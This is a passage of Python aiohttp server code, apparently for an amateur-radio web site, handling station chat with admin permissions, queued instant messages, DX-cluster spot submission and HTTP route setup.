    chatPath = ''
    station = data['station'] if 'station' in data else None
    chat = []
    if station:
        stationPath = getStationPath(data['station'])
        stationSettings = loadJSON(stationPath + '/settings.json')
        admins = [x.lower() for x in\
            stationSettings['chatAdmins'] + [ stationSettings['admin'], ]]
        admin =  isinstance(callsign, str) and callsign in admins
        chatPath = stationPath + '/chat.json'
        chatAccess = stationSettings.get('chatAccess')
        if chatAccess:
            if chatAccess == 'users' and not isinstance(callsign, str):
                return web.HTTPUnauthorized(text='You must be logged in to use this chat.')
            if chatAccess == 'admins' and not admin:
                return web.HTTPUnauthorized(
                        text='You must be logged in as station admin to use this chat.')
    else:
        chatPath = webRoot + '/js/talks.json'
        admin = isinstance(callsign, str) and callsign in siteAdmins
    if ('clear' in data or 'delete' in data or
            ('text' in data and data['text'][0] == '@')):
        callsign = decodeToken(data)
        if not isinstance(callsign, str):
            return callsign
        if 'clear' in data or 'delete' in data:
            admins = siteAdmins + [stationSettings['admin'],] if station else siteAdmins
            if not callsign in admins:
                return web.HTTPUnauthorized(\
                    text = 'You must be logged in as station or site admin')
        else:
            if not callsign in imUsers:
                return web.HTTPUnauthorized(\
                    text = 'You must be logged in as im user')
    if not 'clear' in data and not 'delete' in data:
        insertChatMessage(path=chatPath, msgData=data, admin=admin)
    else:
        if 'delete' in data:
            chat = loadJSON(chatPath)
            if not chat:
                chat = []
            chat = [ x for x in chat if x['ts'] != data['delete'] ]
        with open(chatPath, 'w') as fChat:
            json.dump(chat, fChat, ensure_ascii = False)
    return web.Response(text = 'OK')

async def checkInstantMessageHandler(request):
    data = await request.json()
    rsp = None
    if data['user'] in IM_QUEUE:
        rsp = IM_QUEUE[data['user']]
        del IM_QUEUE[data['user']]
        logging.debug('------- IM_QUEUE -------')
        logging.debug(IM_QUEUE)
    return web.json_response(rsp)

def insertChatMessage(path, msgData, admin):
    CHAT_MAX_LENGTH = int(conf['chat']['max_length'])
    chat = loadJSON(path)
    if not chat:
        chat = []
    msg = {'user': msgData['from'], \
            'text': msgData['text'], \
            'admin': admin, 'ts': time.time()}
    msg['date'], msg['time'] = dtFmt(datetime.utcnow())
    if msg['text'][0] == '@':
        _to, txt = msg['text'][1:].split(' ', maxsplit=1)
        txt = txt.strip()
        if not txt and _to in IM_QUEUE:
            del IM_QUEUE[_to]
        else:
            IM_QUEUE[_to] = {
                    'user': msg['user'],
                    'text': txt,
                    'ts': msg['ts'],
                    'date': msg['date'],
                    'time': msg['time']
                   }
            logging.debug('------- IM_QUEUE -------')
            logging.debug(IM_QUEUE)
    else:
        if 'name' in msgData:
            msg['name'] = msgData['name']
        chat.insert(0, msg)
        chatTrunc = []
        chatAdm = []
        for msg in chat:
            if msg['text'].startswith('***') and msg['admin']:
                chatAdm.append(msg)
            elif len(chatTrunc) < CHAT_MAX_LENGTH:
                chatTrunc.append(msg)
        chat = chatAdm + chatTrunc
        with open(path, 'w') as fChat:
            json.dump(chat, fChat, ensure_ascii = False)

async def sendSpotHandler(request):
    global lastSpotSent
    data = await request.json()
    now = datetime.now().timestamp()
    response = {'sent': False,
            'secondsLeft': conf.getint('cluster', 'spotInterval')}
    if not lastSpotSent or now - lastSpotSent > response['secondsLeft']:
        lastSpotSent = now
        protocol = await  clusterProtocol.connect(APP.loop, \
            call = data['userCS'],
            host = conf.get('cluster', 'host'),
            port = conf.get('cluster', 'port'))

        def sendSpot():
            protocol.write('dx ' + data['cs'] + ' ' + data['freq'] + ' ' + \
                data['info'])
            response['sent'] = True
            APP.loop.call_later(1, protocol.close)

        if protocol:
            logging.debug('Protocol connected')
            protocol.onLoggedIn.append(sendSpot)
            await protocol.waitDisconnected()
            if not response['sent']:
                response['reply'] = protocol.latestReply
    else:
        response['secondsLeft'] -= now - lastSpotSent
    return web.json_response(response)


if __name__ == '__main__':
    APP = web.Application(client_max_size = 200 * 1024 ** 2)
    APP.router.add_post('/aiohttp/login', loginHandler)
    APP.router.add_post('/aiohttp/userSettings', userSettingsHandler)
    APP.router.add_post('/aiohttp/news', newsHandler)
    APP.router.add_post('/aiohttp/track', trackHandler)
    APP.router.add_post('/aiohttp/chat', chatHandler)
    APP.router.add_post('/aiohttp/activeUsers', activeUsersHandler)
    APP.router.add_post('/aiohttp/log', logHandler)
    APP.router.add_post('/aiohttp/location', locationHandler)
    APP.router.add_post('/aiohttp/publish', publishHandler)
    APP.router.add_post('/aiohttp/passwordRecoveryRequest', \
            passwordRecoveryRequestHandler)
    APP.router.add_post('/aiohttp/contact', contactHandler)
    APP.router.add_post('/aiohttp/userData', userDataHandler)
    APP.router.add_post('/aiohttp/gallery', galleryHandler)
    APP.router.add_post('/aiohttp/sendSpot', sendSpotHandler)
    APP.router.add_post('/aiohttp/instantMessage', checkInstantMessageHandler)
    APP.router.add_get('/aiohttp/adif/{callsign}', exportAdifHandler)

    db.verbose = True

    async def onStartup(_):
        await db.connect()

    APP.on_startup.append(onStartup)

    args = parser.parse_args()
    web.run_app(APP, path = conf.get('sockets', 'srv'))
